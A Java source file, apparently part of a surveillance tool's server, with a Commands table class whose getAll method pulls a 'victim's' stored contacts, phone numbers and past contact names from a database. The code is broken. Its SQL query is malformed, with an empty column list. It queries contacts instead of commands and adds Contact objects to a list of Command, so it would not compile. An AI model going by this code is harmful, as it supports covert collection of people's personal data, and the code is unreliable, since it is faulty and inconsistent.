package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Command;
import com.theah64.xrob.api.models.Contact;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 14/9/16,4:37 PM.
 */
public class Commands extends BaseTable<Command> {
    private Commands() {
    }

    private static final Commands instance = new Commands();

    public static Commands getInstance() {
        return instance;
    }

    @Override
    public List<Command> getAll(String clientId, String victimId) {

        List<Command> commands = null;

        final String query = "SELECT ,UNIX_TIMESTAMP(c.created_at) AS unix_epoch FROM contacts c INNER JOIN phone_numbers p ON p.contact_id = c.id LEFT JOIN contact_names_audit cna ON cna.contact_id = c.id WHERE c.victim_id= ? GROUP BY c.id ORDER BY c.id DESC;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                commands = new ArrayList<>();
                do {
                    final String name = rs.getString(COLUMN_NAME);
                    final String preNames = rs.getString(COLUMN_AS_PRE_NAMES);
                    final long syncedAt = rs.getLong(COLUMN_AS_UNIX_EPOCH);

                    final String[] phoneNumbers = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_NUMBERS));
                    final String[] phoneTypes = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_TYPES));

                    List<Contact.PhoneNumber> phoneNumbersList = null;
                    if (phoneNumbers != null) {
                        phoneNumbersList = new ArrayList<>(phoneNumbers.length);
                        for (int i = 0; i < phoneNumbers.length; i++) {
                            phoneNumbersList.add(new Contact.PhoneNumber(null, phoneNumbers[i], phoneTypes[i]));
                        }
                    }

                    commands.add(new Contact(null, null, null, name, phoneNumbersList, preNames, syncedAt));

                } while (rs.next());
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
            try {
                con.close();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        }
        return commands;
    }
}
